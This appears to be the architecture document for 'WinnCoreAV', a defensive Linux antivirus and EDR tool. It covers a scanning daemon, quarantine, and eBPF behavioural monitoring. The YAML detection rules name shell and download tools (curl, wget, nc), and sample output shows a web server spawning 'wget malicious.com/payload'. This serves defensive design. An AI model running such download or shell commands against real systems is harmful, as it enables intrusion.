# 🏗️ WinnCoreAV Phase 1 & 2 Detailed Architecture
**Real-Time File Protection + Behavioral Monitoring**

Version: 1.0  
Last Updated: 2025-11-16  
Author: Zachary Winn  
Project: WinnCoreAV ARM64 EDR

---

## 📋 TABLE OF CONTENTS

1. [Overview](#overview)
2. [Phase 1: Real-Time File Protection](#phase-1-real-time-file-protection)
3. [Phase 2: Behavioral Monitoring](#phase-2-behavioral-monitoring)
4. [Non-Code Attack Vectors](#non-code-attack-vectors)
5. [Modular CLI Architecture](#modular-cli-architecture)
6. [Implementation Roadmap](#implementation-roadmap)
7. [Testing & Validation](#testing--validation)

---

## 🎯 OVERVIEW

### Purpose
This document provides the complete technical architecture for Phases 1 and 2 of WinnCoreAV's 
EDR capabilities. Each component is designed as a standalone CLI tool with clear inputs/outputs,
training capabilities, and integration points.

### Design Principles
1. **Modularity**: Each component is an independent CLI tool
2. **Composability**: Tools can be chained via JSON I/O
3. **Trainability**: Each tool can learn and improve via feedback loops
4. **Testability**: Synthetic attack simulation for each detection type
5. **ARM64-First**: Optimized for ARM64 from the ground up

### Technology Stack
- **Language**: Rust (memory safety, performance)
- **Kernel Integration**: eBPF (behavioral monitoring without kernel modules)
- **ML Runtime**: ONNX (cross-platform model inference)
- **IPC**: Tokio mpsc channels (async message passing)
- **Storage**: SQLite (lightweight, embedded)
- **Config**: TOML (human-readable configuration)

---

## 🛡️ PHASE 1: REAL-TIME FILE PROTECTION

**Status**: 60% Complete  
**Goal**: 24/7 malware detection with auto-response  
**Timeline**: 2 weeks to completion

---

### Component 1.1: av-daemon (Background Service)

**Mission**: Continuously monitor file system for malware

#### Architecture Diagram
```
┌─────────────────────────────────────────────────────────┐
│                      av-daemon                           │
│                                                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │        File Monitor (inotify)                     │  │
│  │  - Watches: /home, /tmp, /opt, /usr/local/bin   │  │
│  │  - Events: CREATE, MODIFY, CLOSE_WRITE           │  │
│  │  - Debounce: 5 seconds per file                  │  │
│  └────────────────┬─────────────────────────────────┘  │
│                   │                                      │
│                   ↓                                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │     Scan Deduplicator (Mission 1.1 - CRITICAL)   │  │
│  │  - HashMap<path, last_scan_time>                 │  │
│  │  - Skip if scanned within 5 seconds              │  │
│  │  - Prevents 4x duplicate scans                   │  │
│  └────────────────┬─────────────────────────────────┘  │
│                   │                                      │
│                   ↓                                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │           Scan Queue (bounded mpsc)              │  │
│  │  - Capacity: 1,000 files                         │  │
│  │  - Timeout: 30 seconds per scan                  │  │
│  │  - Priority: Executables first                   │  │
│  └────────────────┬─────────────────────────────────┘  │
│                   │                                      │
│                   ↓                                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │        ML Scanner (Singleton - CRITICAL)         │  │
│  │  - Load ONNX model ONCE at daemon startup       │  │
│  │  - Model: gbm_v3_hardened.onnx (187KB)          │  │
│  │  - Feature extraction: entropy, strings, PE      │  │
│  │  - Inference time: ~10ms per file               │  │
│  └────────────────┬─────────────────────────────────┘  │
│                   │                                      │
│                   ↓                                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │           Scoring & Decision                     │  │
│  │  - Score range: 0.0 - 1.0                        │  │
│  │  - Clean: < 0.70                                 │  │
│  │  - Suspicious: 0.70 - 0.85                       │  │
│  │  - Malicious: 0.85 - 0.95                        │  │
│  │  - Critical: > 0.95                              │  │
│  └────────────────┬─────────────────────────────────┘  │
│                   │                                      │
│                   ↓                                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │              Response Engine                      │  │
│  │  - Log: All scans                                │  │
│  │  - Alert: Score > 0.70                           │  │
│  │  - Quarantine: Score > 0.85                      │  │
│  │  - Kill Process: Score > 0.95                    │  │
│  └────────────────┬─────────────────────────────────┘  │
│                   │                                      │
│                   ↓                                      │
│  ┌──────────────────────────────────────────────────┐  │
│  │         Stats Reporter (1-min interval)          │  │
│  │  - Scans performed                               │  │
│  │  - Threats detected                              │  │
│  │  - Files quarantined                             │  │
│  │  - Processes killed                              │  │
│  │  - Uptime                                        │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

#### Configuration File
**Location**: `/etc/winncore/daemon.toml`
```toml
[daemon]
pid_file = "/var/run/winncore-av.pid"
log_file = "/var/log/winncore-av/daemon.log"
working_dir = "/var/lib/winncore"

[monitoring]
# Paths to watch for file changes
watch_paths = [
    "/home",
    "/tmp", 
    "/opt",
    "/usr/local/bin",
    "/var/www"
]

# Paths to ignore (performance optimization)
ignore_paths = [
    "/proc",
    "/sys", 
    "/dev",
    "/var/lib/winncore",  # Don't scan our own files
    "*.log",              # Skip log files
    "*.tmp"               # Skip temporary files
]

# Watch settings
scan_on_create = true
scan_on_modify = true
scan_on_execute = true
debounce_ms = 5000  # Wait 5 seconds before scanning

[ml_model]
model_path = "/var/lib/winncore/models/gbm_v3_hardened.onnx"
threshold = 0.5  # ML model decision threshold
load_at_startup = true  # CRITICAL: Load once, not per scan

[response]
enabled = true
auto_kill = false        # Disabled by default for safety
auto_quarantine = true
auto_block_network = false

[thresholds]
kill_threshold = 0.95           # Kill process if score >= 95%
quarantine_threshold = 0.85     # Quarantine if score >= 85%
alert_threshold = 0.70          # Just alert if score >= 70%

[limits]
max_actions_per_minute = 10     # Safety: max 10 kills/quarantines per minute
max_scan_queue = 1000          # Max files waiting to be scanned
scan_timeout_seconds = 30      # Timeout for individual scans
max_memory_mb = 100            # Max memory usage

[logging]
level = "info"  # trace, debug, info, warn, error
output = "journald"  # journald, file, stdout
```

#### CLI Commands
```bash
# Start daemon (foreground)
winncore-daemon

# Start as systemd service
sudo systemctl start winncore-av

# Check status
winncore-daemon status
# Output:
# ✅ WinnCoreAV Daemon is running
#    PID: 12345
#    Uptime: 2 days, 5 hours
#    Scans: 45,231
#    Threats: 12
#    Quarantined: 10
#    Killed: 2

# View real-time stats
winncore-daemon stats --follow

# Reload configuration (without restart)
winncore-daemon reload

# Stop daemon
winncore-daemon stop

# Enable auto-kill (dangerous!)
winncore-daemon set auto-kill true

# Disable auto-quarantine
winncore-daemon set auto-quarantine false

# Test with specific file
winncore-daemon test-scan /path/to/suspicious-file
```

#### Data Structures
```rust
// av-daemon/src/main.rs

use std::sync::Arc;
use tokio::sync::{mpsc, RwLock};
use av_core::Scanner;

/// Shared state across all async tasks
#[derive(Clone)]
struct DaemonState {
    /// ML scanner (loaded ONCE at startup)
    scanner: Arc<Scanner>,
    
    /// Response engine for handling threats
    response: Arc<RwLock<ResponseEngine>>,
    
    /// Configuration
    config: Arc<DaemonConfig>,
    
    /// Statistics tracker
    stats: Arc<RwLock<Stats>>,
    
    /// Scan deduplicator (prevents duplicate scans)
    dedup: Arc<ScanDeduplicator>,
}

/// Runtime statistics
#[derive(Debug, Default)]
struct Stats {
    scans_today: u64,
    threats_found: u64,
    files_quarantined: u64,
    processes_killed: u64,
    uptime_start: std::time::Instant,
    last_scan_time: Option<std::time::Instant>,
}

/// Scan deduplicator
struct ScanDeduplicator {
    recent_scans: Arc<RwLock<HashMap<String, Instant>>>,
    debounce_duration: Duration,
}

impl ScanDeduplicator {
    /// Returns true if file should be scanned
    async fn should_scan(&self, path: &str) -> bool {
        let mut scans = self.recent_scans.write().await;
        
        // Check if scanned recently
        if let Some(&last_scan) = scans.get(path) {
            if last_scan.elapsed() < self.debounce_duration {
                return false; // Skip - scanned too recently
            }
        }
        
        // Record this scan
        scans.insert(path.to_string(), Instant::now());
        
        // Cleanup old entries
        scans.retain(|_, &mut time| 
            time.elapsed() < self.debounce_duration * 2
        );
        
        true
    }
}
```

#### Critical Bug Fix: Scan Deduplication

**Problem**: File watcher triggers 4 events per file, causing:
- 4 separate scans
- ML model loaded 4 times (200MB memory waste)
- 4x CPU usage

**Solution**: Scan deduplication with 5-second window

**Implementation Status**: 
- ✅ Module created: `av-daemon/src/dedup.rs`
- ❌ Integration pending: `av-daemon/src/main.rs`

**Integration Steps**:
```rust
// 1. Add module import
mod dedup;
use dedup::ScanDeduplicator;

// 2. Add to DaemonState
struct DaemonState {
    // ... existing fields ...
    dedup: Arc<ScanDeduplicator>,
}

// 3. Create instance in main()
let dedup = ScanDeduplicator::new(config.monitoring.debounce_ms);

// 4. Add to state
let state = DaemonState {
    // ... existing fields ...
    dedup: Arc::new(dedup),
};

// 5. Check dedup in scan_file() - FIRST LINE
async fn scan_file(path: PathBuf, state: DaemonState) {
    let path_str = path.to_string_lossy().to_string();
    if !state.dedup.should_scan(&path_str).await {
        return; // Skip - already scanned recently
    }
    
    // ... rest of function ...
}
```

**Testing**:
```bash
# Build with dedup
cargo build --release --bin av-daemon

# Run daemon
./target/release/av-daemon &

# Create test file (will trigger multiple inotify events)
cp ~/malware-research/samples/backdoor_0 /tmp/dedup_test

# Check logs - should see "Scanning" only ONCE
journalctl -u winncore-av | grep "Scanning.*dedup_test"
# Expected: 1 line (not 4!)

# Check model loads - should be ONCE
journalctl -u winncore-av | grep "Loading ML model"
# Expected: 1 line at daemon startup (not 4 per file!)
```

**Success Criteria**:
- ✅ Each file scanned exactly once
- ✅ ML model loaded once per daemon lifetime
- ✅ Memory usage reduced by 75%
- ✅ No performance degradation

---

### Component 1.2: av-scan (On-Demand Scanner)

**Mission**: Manual and scheduled file system scans

#### Architecture
```
av-scan
├── Path Scanner
│   ├── Recursive directory traversal
│   ├── Parallel scanning (configurable workers)
│   ├── Smart skip (based on extensions)
│   └── Follow symlinks (optional)
│
├── Progress Reporter
│   ├── Real-time progress bar
│   ├── Files/sec throughput
│   ├── ETA calculation
│   └── Memory usage tracking
│
├── Report Generator
│   ├── JSON (machine-readable)
│   ├── HTML (human-readable with charts)
│   ├── CSV (for SIEM ingestion)
│   └── PDF (executive summary)
│
└── Scheduler Integration
    ├── Cron-compatible
    ├── systemd timer
    └── Auto-scan on mount
```

#### CLI Commands
```bash
# Basic scan
av-scan /home/user

# Recursive scan with progress
av-scan /opt --recursive --progress

# Parallel scanning (16 workers)
av-scan /var --workers 16 --recursive

# Quick scan (common malware locations)
av-scan --quick
# Scans: /tmp, /home/*/Downloads, /var/www, /opt

# Full system scan (excluding system dirs)
av-scan --full-system
# Automatically excludes: /proc, /sys, /dev, /run

# Custom excludes
av-scan /home --exclude '*.log,*.tmp,node_modules'

# Output formats
av-scan /tmp --output json > report.json
av-scan /var --output html > report.html
av-scan /opt --output csv > report.csv

# Scheduled scan (via cron)
# Add to crontab: 0 2 * * * av-scan --full-system --output json >> /var/log/winncore/scans.jsonl

# Scan on USB mount (via udev rule)
# /etc/udev/rules.d/99-winncore-usb.rules:
# ACTION=="add", SUBSYSTEM=="block", ENV{ID_FS_TYPE}!="", RUN+="/usr/local/bin/av-scan /media/%E{ID_FS_LABEL}"
```

#### Report Format (JSON)
```json
{
  "scan_id": "550e8400-e29b-41d4-a716-446655440000",
  "start_time": "2025-11-16T10:30:00Z",
  "end_time": "2025-11-16T10:35:23Z",
  "duration_seconds": 323,
  "scanned_paths": ["/home/user"],
  "files_scanned": 45231,
  "files_per_second": 140,
  "threats_found": 3,
  "threats": [
    {
      "path": "/home/user/Downloads/malware.exe",
      "hash": "d41d8cd98f00b204e9800998ecf8427e",
      "score": 0.987,
      "detection_type": "ml",
      "action_taken": "quarantined",
      "timestamp": "2025-11-16T10:32:15Z"
    },
    {
      "path": "/home/user/.bashrc",
      "hash": "098f6bcd4621d373cade4e832627b4f6",
      "score": 0.876,
      "detection_type": "yara",
      "yara_rules": ["backdoor_generic", "persistence"],
      "action_taken": "quarantined",
      "timestamp": "2025-11-16T10:33:42Z"
    }
  ],
  "summary": {
    "clean": 45228,
    "suspicious": 0,
    "malicious": 3
  }
}
```

#### Training Loop: Path Optimization
```bash
# Analyze scan history to optimize future scans
av-scan analyze --history 30d

# Output:
# 📊 Scan Analysis (last 30 days)
# 
# Most frequently scanned paths:
#   1. /tmp (45 scans, 0 threats)
#   2. /home/user/Downloads (30 scans, 12 threats) ⚠️ HIGH RISK
#   3. /opt (20 scans, 0 threats)
# 
# Suggested optimizations:
#   • Add /tmp to quick-scan (high frequency)
#   • Increase monitoring on /home/user/Downloads (high threat rate)
#   • Consider excluding /opt from daily scans (never finds threats)
# 
# Suggested exclude patterns:
#   • *.log (1.2M files, 0 threats, 30% of scan time)
#   • node_modules (450K files, 0 threats, 15% of scan time)
#   • .cache (380K files, 0 threats, 12% of scan time)

# Apply suggestions
av-scan apply-optimizations --auto

# Generate optimal scan profile
av-scan generate-profile --name daily-scan --optimize-for speed
# Creates: /etc/winncore/scan-profiles/daily-scan.toml
```

---

### Component 1.3: av-quarantine (Isolation Manager)

**Mission**: Safely isolate and manage malicious files

#### Architecture
```
av-quarantine
├── Quarantine Vault
│   ├── Location: /var/lib/winncore/quarantine
│   ├── Encryption: AES-256-GCM
│   ├── Indexing: SHA256 hash
│   └── Permissions: root:root 000
│
├── Metadata Database (SQLite)
│   ├── Original path
│   ├── Detection timestamp
│   ├── ML score
│   ├── YARA matches (if any)
│   ├── Process info (if killed)
│   └── Restore status
│
├── Restore Engine
│   ├── Safety re-scan before restore
│   ├── Audit logging
│   ├── Admin approval (optional)
│   └── Rollback capability
│
└── Cleanup Manager
    ├── Auto-delete after N days
    ├── Manual purge
    ├── Export for analysis
    └── Disk usage monitoring
```

#### Quarantine Database Schema
```sql
CREATE TABLE quarantined_files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hash TEXT NOT NULL UNIQUE,
    original_path TEXT NOT NULL,
    quarantine_path TEXT NOT NULL,
    encrypted BOOLEAN DEFAULT true,
    
    -- Detection info
    detected_at TIMESTAMP NOT NULL,
    detection_score REAL NOT NULL,
    detection_method TEXT NOT NULL, -- 'ml', 'yara', 'behavior'
    yara_rules TEXT, -- JSON array if YARA detected
    
    -- Process info (if killed)
    process_pid INTEGER,
    process_name TEXT,
    process_cmdline TEXT,
    
    -- Status
    status TEXT NOT NULL DEFAULT 'quarantined', -- 'quarantined', 'restored', 'deleted', 'exported'
    restored_at TIMESTAMP,
    restored_to TEXT,
    deleted_at TIMESTAMP,
    
    -- Metadata
    file_size INTEGER,
    file_type TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    -- Notes
    analyst_notes TEXT,
    false_positive BOOLEAN DEFAULT false
);

CREATE INDEX idx_hash ON quarantined_files(hash);
CREATE INDEX idx_detected_at ON quarantined_files(detected_at);
CREATE INDEX idx_status ON quarantined_files(status);
```

#### CLI Commands
```bash
# List all quarantined files
av-quarantine list
# Output:
# HASH                              PATH                           SCORE  DATE       STATUS
# d41d8cd98f00b204e9800998ecf8427e  /tmp/malware.exe              0.987  2025-11-16 quarantined
# 098f6bcd4621d373cade4e832627b4f6  /home/user/.bashrc            0.876  2025-11-15 quarantined
# 5d41402abc4b2a76b9719d911017c592  /opt/suspicious-script.sh     0.912  2025-11-14 restored

# List with filters
av-quarantine list --status quarantined --score-min 0.9
av-quarantine list --date-after 2025-11-10
av-quarantine list --path /home/user/*

# View detailed info
av-quarantine info d41d8cd98f00b204e9800998ecf8427e
# Output:
# 📄 Quarantined File Details
# 
# Hash: d41d8cd98f00b204e9800998ecf8427e
# Original Path: /tmp/malware.exe
# Quarantine Path: /var/lib/winncore/quarantine/d41d8cd98f00b204e9800998ecf8427e.enc
# 
# Detection:
#   Timestamp: 2025-11-16 10:32:15 UTC
#   Score: 0.987 (CRITICAL)
#   Method: ML + YARA
#   YARA Rules: backdoor_generic, crypto_miner
# 
# Process:
#   PID: 12345
#   Name: malware.exe
#   Command: ./malware.exe --server malicious.com:8080
#   Killed: Yes
# 
# File Info:
#   Size: 1.2 MB
#   Type: ELF 64-bit executable
#   Encrypted: Yes
# 
# Status: Quarantined (5 days ago)

# Restore file (with confirmation and re-scan)
av-quarantine restore d41d8cd98f00b204e9800998ecf8427e --to /tmp/restored_file
# Output:
# ⚠️  WARNING: Restoring potentially malicious file
# 
# File: /tmp/malware.exe (score: 0.987)
# Restore to: /tmp/restored_file
# 
# Before restoring, this file will be re-scanned with latest signatures.
# 
# Continue? [y/N] y
# 
# 🔍 Re-scanning file...
# ⚠️  RE-SCAN RESULT: Still malicious (score: 0.991)
# 
# Are you SURE you want to restore this file? [yes/NO] yes
# 
# ✅ File restored to /tmp/restored_file
# 🔓 File permissions: 000 (read/write/execute disabled)
# 📝 Audit log entry created
# 
# To enable execution: chmod +x /tmp/restored_file

# Mark as false positive and restore
av-quarantine restore d41d8cd98f00b204e9800998ecf8427e --false-positive --to /tmp/safe_file
# This will:
# 1. Restore the file
# 2. Mark in database as false positive
# 3. Add to ML training queue for model improvement

# Delete permanently
av-quarantine delete d41d8cd98f00b204e9800998ecf8427e
# Output:
# ⚠️  WARNING: This will PERMANENTLY delete the file
# 
# Hash: d41d8cd98f00b204e9800998ecf8427e
# Path: /tmp/malware.exe
# 
# This action CANNOT be undone!
# 
# Type the hash to confirm: d41d8cd98f00b204e9800998ecf8427e
# 
# ✅ File permanently deleted

# Export for analysis (creates password-protected ZIP)
av-quarantine export d41d8cd98f00b204e9800998ecf8427e --output malware-sample.zip --password infected
# Output:
# 📦 Exporting quarantined file...
# 
# ✅ Created: malware-sample.zip
#    Password: infected
#    Contents:
#      - malware.exe (original file)
#      - metadata.json (detection info)
#      - process.log (process tree at detection)
# 
# ⚠️  WARNING: This file is malicious! Use in isolated environment only.

# Purge old files (auto-delete after N days)
av-quarantine purge --older-than 30d
# Output:
# 🗑️  Purging files older than 30 days...
# 
# Found 15 files:
#   • 12 files marked for deletion
#   • 3 files marked as false positives (keeping)
# 
# Total space to free: 45.2 MB
# 
# Continue? [y/N] y
# 
# ✅ Deleted 12 files
# 💾 Freed 45.2 MB

# Show disk usage
av-quarantine usage
# Output:
# 💾 Quarantine Vault Usage
# 
# Location: /var/lib/winncore/quarantine
# Total files: 127
# Total size: 234.5 MB
# 
# Breakdown by status:
#   • Quarantined: 98 files (198.3 MB)
#   • Restored: 12 files (15.2 MB)
#   • False positives: 17 files (21.0 MB)
# 
# Oldest file: 2024-08-15 (93 days ago)
# Newest file: 2025-11-16 (today)
# 
# Recommendation: Run 'av-quarantine purge --older-than 30d' to free space
```

#### Training Loop: False Positive Management
```bash
# View false positive history
av-quarantine false-positives --list

# Analyze false positive patterns
av-quarantine false-positives --analyze
# Output:
# 📊 False Positive Analysis
# 
# Total false positives: 23 (in last 30 days)
# False positive rate: 1.8%
# 
# Common patterns:
#   1. Python scripts with "eval()" (12 occurrences)
#   2. Compiled Go binaries (5 occurrences)
#   3. Shell scripts with network calls (6 occurrences)
# 
# Suggested model improvements:
#   • Add whitelist for known Python idioms
#   • Improve Go binary detection (low entropy packed sections)
#   • Context-aware analysis for shell scripts
# 
# Generate training data? [y/N] y
# ✅ Created: /var/lib/winncore/training/false-positives-2025-11-16.jsonl
# 
# Next steps:
#   1. Review training data for correctness
#   2. Retrain ML model: cd ~/WinnCore-ML-Detector && python train.py --with-corrections
#   3. Deploy new model: cp model.onnx /var/lib/winncore/models/
#   4. Restart daemon: systemctl restart winncore-av

# Export false positives for model retraining
av-quarantine false-positives --export training-data.jsonl

# Training data format (JSONL):
{"path": "/tmp/script.py", "score": 0.89, "actual": "benign", "features": {...}}
{"path": "/opt/app", "score": 0.91, "actual": "benign", "features": {...}}
```

---

## 🕵️ PHASE 2: BEHAVIORAL MONITORING

**Status**: 0% Complete  
**Goal**: Detect malware by behavior, not just signatures  
**Timeline**: 4-6 weeks

### Why Behavioral Monitoring?

**Problem with signature-only detection**:
- Misses zero-day malware
- Evaded by polymorphic malware
- Requires constant signature updates

**Behavioral detection advantages**:
- Detects unknown threats
- Catches living-off-the-land attacks
- Identifies insider threats
- Real-time response

---

### Component 2.1: av-behavior (eBPF Syscall Monitor)

**Mission**: Real-time behavioral analysis via kernel instrumentation

#### Why eBPF?

**eBPF (Extended Berkeley Packet Filter) advantages**:
1. **Kernel-level monitoring** - can't be evaded by userspace malware
2. **Zero overhead** - compiled to native instructions, <1% CPU
3. **Safe** - verified by kernel, can't crash system
4. **No kernel module** - works on any 5.x+ kernel
5. **Real-time** - events delivered via ring buffer in microseconds

**vs Traditional Approaches**:
- ❌ Kernel modules: Risky, can crash kernel, hard to maintain
- ❌ ptrace: High overhead (10-50%), easily detected
- ❌ Auditd: Limited syscall coverage, high log volume
- ✅ eBPF: Safe, fast, comprehensive

#### Architecture
```
┌─────────────────────────────────────────────────────────┐
│                     Kernel Space                         │
│                                                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │              eBPF Programs                        │  │
│  │                                                   │  │
│  │  [execve]  [openat]  [connect]  [unlink]        │  │
│  │     ↓         ↓         ↓          ↓             │  │
│  │  ┌──────────────────────────────────────┐       │  │
│  │  │      Shared Ring Buffer (1MB)        │       │  │
│  │  └──────────────────────────────────────┘       │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
                         ↓
                         ↓ (perf event / ring buffer read)
                         ↓
┌─────────────────────────────────────────────────────────┐
│                      User Space                          │
│                                                          │
│  ┌──────────────────────────────────────────────────┐  │
│  │           Event Aggregator (av-behavior)         │  │
│  │                                                   │  │
│  │  ┌─────────────────────────────────────────┐    │  │
│  │  │      Event Consumer (Tokio async)       │    │  │
│  │  │  - Read from ring buffer                │    │  │
│  │  │  - Parse syscall events                 │    │  │
│  │  │  - Build process tree                   │    │  │
│  │  └─────────────────────────────────────────┘    │  │
│  │                       ↓                          │  │
│  │  ┌─────────────────────────────────────────┐    │  │
│  │  │      Behavior Analyzer                  │    │  │
│  │  │  - Pattern matching                     │    │  │
│  │  │  - Anomaly detection                    │    │  │
│  │  │  - Threat scoring                       │    │  │
│  │  └─────────────────────────────────────────┘    │  │
│  │                       ↓                          │  │
│  │  ┌─────────────────────────────────────────┐    │  │
│  │  │      Response Engine                    │    │  │
│  │  │  - Kill process                         │    │  │
│  │  │  - Network isolation                    │    │  │
│  │  │  - Alert admin                          │    │  │
│  │  └─────────────────────────────────────────┘    │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

#### Syscalls to Monitor

**Process Execution**:
- `execve` - New process created
- `fork` / `clone` - Process duplication
- `exit_group` - Process termination

**File Operations**:
- `openat` - File opened
- `read` / `write` - File I/O
- `unlink` / `unlinkat` - File deletion
- `rename` - File renamed
- `chmod` - Permissions changed

**Network Operations**:
- `socket` - Socket created
- `connect` - Outbound connection
- `bind` - Inbound listener
- `sendto` / `recvfrom` - Data transfer

**Security Operations**:
- `setuid` / `setgid` - Privilege changes
- `ptrace` - Process debugging/injection
- `mount` - Filesystem mounting
- `mmap` - Memory mapping (shellcode injection)

#### Event Data Structure
```rust
// av-behavior/src/event.rs

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallEvent {
    /// Event ID (monotonic counter)
    pub id: u64,
    
    /// Timestamp (nanoseconds since boot)
    pub timestamp: u64,
    
    /// Process info
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub gid: u32,
    pub comm: String,  // Process name (limited to 16 chars)
    
    /// Syscall info
    pub syscall: Syscall,
    pub args: Vec<SyscallArg>,
    pub return_value: i64,
    
    /// Context
    pub cwd: String,
    pub exe_path: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Syscall {
    Execve,
    Openat,
    Connect,
    Unlink,
    Setuid,
    Ptrace,
    // ... more syscalls
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum SyscallArg {
    String(String),
    Integer(i64),
    Pointer(u64),
    FileDescriptor(i32),
    SocketAddr(SocketAddr),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SocketAddr {
    pub family: String,  // AF_INET, AF_INET6, AF_UNIX
    pub addr: String,    // IP address or path
    pub port: u16,
}
```

#### Behavior Detection Rules

**Rule Format**: YAML-based for easy editing
```yaml
# /etc/winncore/behavior-rules/ransomware.yaml

name: rapid_file_encryption
description: Ransomware-like behavior (many files modified/deleted quickly)
severity: critical
enabled: true

pattern:
  # Trigger conditions (ALL must match)
  conditions:
    # Many file opens in short time
    - type: syscall_count
      syscall: openat
      threshold: 100
      timewindow: 10s  # 100 files in 10 seconds
    
    # Followed by writes
    - type: syscall_count
      syscall: write
      threshold: 100
      timewindow: 10s
    
    # And many deletions (ransomware deletes originals)
    - type: syscall_sequence
      sequence:
        - openat
        - write
        - unlink
      count: 50  # 50+ files with this sequence
      timewindow: 10s
  
  # Additional indicators (ANY matches increase score)
  indicators:
    - type: file_extension_change
      pattern: ".encrypted$|.locked$|.crypto$"
    
    - type: network_connection
      destination: "tor_exit_node|pastebin.com"
    
    - type: process_name
      pattern: "ransom|crypt|locker"
  
  # Exclusions (if ANY matches, don't trigger)
  exclusions:
    - type: process_name
      pattern: "^(rsync|tar|zip|7z)$"  # Legitimate backup tools
    
    - type: user
      uid: 0  # Root doing backups is normal

# Response
action:
  - kill_process: true
  - quarantine_files: true
  - alert: high
  - isolate_network: false  # Don't isolate (might be legitimate backup)

# Scoring
base_score: 0.9
indicator_bonus: 0.02  # Each indicator adds 2%
max_score: 0.99
```

More detection rules:
```yaml
# /etc/winncore/behavior-rules/crypto-miner.yaml

name: cryptocurrency_miner
description: Crypto mining behavior (high CPU + stratum connections)
severity: high
enabled: true

pattern:
  conditions:
    # High CPU usage
    - type: cpu_usage
      threshold: 80
      duration: 60s
    
    # Connection to mining pool
    - type: network_connection
      protocol: tcp
      port_range: [3333, 9999]  # Common mining ports
      pattern: "stratum\\+tcp://|pool\\."
  
  indicators:
    - type: process_name
      pattern: "xmr|miner|cpuminer|ethminer|claymore"
    
    - type: network_bandwidth
      upload: ">10MB/min"  # High upload (shares)

action:
  - kill_process: true
  - block_network: true
  - alert: high

base_score: 0.85
```
```yaml
# /etc/winncore/behavior-rules/web-shell.yaml

name: web_shell_execution
description: Web server spawning shell processes
severity: critical
enabled: true

pattern:
  conditions:
    # Parent process is web server
    - type: parent_process
      pattern: "^(apache2|nginx|httpd|php-fpm)$"
    
    # Child is shell or interpreter
    - type: process_name
      pattern: "^(bash|sh|zsh|python|perl|ruby|php)$"
  
  indicators:
    # Suspicious command patterns
    - type: cmdline
      pattern: "curl|wget|nc|netcat|/bin/sh|chmod\\+x"
    
    # Network connection from child
    - type: network_connection
      by: child_process

action:
  - kill_process: true
  - quarantine_files: true
  - alert: critical
  - isolate_network: true

base_score: 0.95
```

#### CLI Commands
```bash
# Start behavior monitoring
av-behavior monitor
# Output:
# ✅ eBPF programs loaded
#    - execve: monitoring process creation
#    - openat: monitoring file access
#    - connect: monitoring network connections
#    - unlink: monitoring file deletion
#    - setuid: monitoring privilege escalation
# 
# 📊 Event rate: ~500 events/sec
# 💾 Memory: 12 MB (ring buffer)
# 🔋 CPU: 0.3%
# 
# Monitoring... (Ctrl+C to stop)

# Live view with filtering
av-behavior watch --filter suspicious
# Shows real-time suspicious events:
# [2025-11-16 14:32:15] ⚠️  SUSPICIOUS: apache2 (PID 1234) spawned bash (PID 5678)
# [2025-11-16 14:32:16] 🔴 RANSOMWARE: process 9012 opened 150 files in 8 seconds
# [2025-11-16 14:32:20] ⚠️  PRIVILEGE: process 3456 called setuid(0)

# View process tree
av-behavior tree <pid>
# Output:
# Process Tree for PID 5678:
# 
# systemd (1)
#  └─ apache2 (1234) [/usr/sbin/apache2]
#      └─ bash (5678) [/bin/bash -c "wget malicious.com/payload"] ⚠️ SUSPICIOUS
#          └─ wget (5679) [/usr/bin/wget malicious.com/payload] 🔴 MALICIOUS

# Analyze recorded events
av-behavior analyze /var/log/winncore/behavior.jsonl --since 1h
# Output:
# 📊 Behavior Analysis (last 1 hour)
# 
# Events: 1,834,291
# Processes: 1,245
# Suspicious: 23
# Malicious: 3
# 
# Top suspicious processes:
#   1. PID 5678 (bash) - Score: 0.95 - Web shell
#   2. PID 9012 (cryptolocker) - Score: 0.98 - Ransomware
#   3. PID 3456 (rootkit.ko) - Score: 0.92 - Kernel module
# 
# Behavioral patterns detected:
#   • Rapid file encryption (1 instance)
#   • Web shell execution (1 instance)
#   • Privilege escalation attempt (5 instances)

# Test behavior rule
av-behavior test-rule /etc/winncore/behavior-rules/ransomware.yaml --simulate
# Simulates ransomware behavior and shows if rule would trigger

# Block specific process behavior
av-behavior block <pid> --reason "ransomware detected"
# Sends SIGSTOP to process, preventing further execution

# Kill process and children
av-behavior kill <pid> --recursive
# Sends SIGKILL to process and all descendants

# Show statistics
av-behavior stats
# Output:
# 📊 Behavior Monitor Statistics
# 
# Uptime: 2 days, 5 hours
# Events processed: 234,891,245
# Events/sec (avg): 512
# Events/sec (current): 487
# 
# Syscalls monitored:
#   • execve: 45,231 calls
#   • openat: 189,345,123 calls
#   • connect: 12,456 calls
#   • unlink: 3,456 calls
#   • setuid: 23 calls
# 
# Detections:
#   • Ransomware: 2 instances (2 killed)
#   • Crypto miners: 5 instances (5 killed)
#   • Web shells: 1 instance (1 killed)
#   • Privilege escalation: 12 attempts (all blocked)
# 
# Memory: 15 MB
# CPU: 0.4%
```

#### Training Loop: Baseline Learning
```bash
# Record normal behavior baseline (7 days)
av-behavior learn --duration 7d --output /var/lib/winncore/baseline.db
# Output:
# 🎓 Learning baseline behavior...
# 
# Duration: 7 days
# Output: /var/lib/winncore/baseline.db
# 
# This will record:
#   • Normal process execution patterns
#   • Typical file access patterns
#   • Expected network connections
#   • Standard privilege usage
# 
# Started: 2025-11-16 00:00:00
# ETA: 2025-11-23 00:00:00
# 
# [====================] 7/7 days (100%)
# 
# ✅ Baseline learning complete!
# 
# Statistics:
#   • Processes observed: 12,456
#   • Unique executables: 1,234
#   • File access patterns: 45,678
#   • Network endpoints: 234
# 
# Next steps:
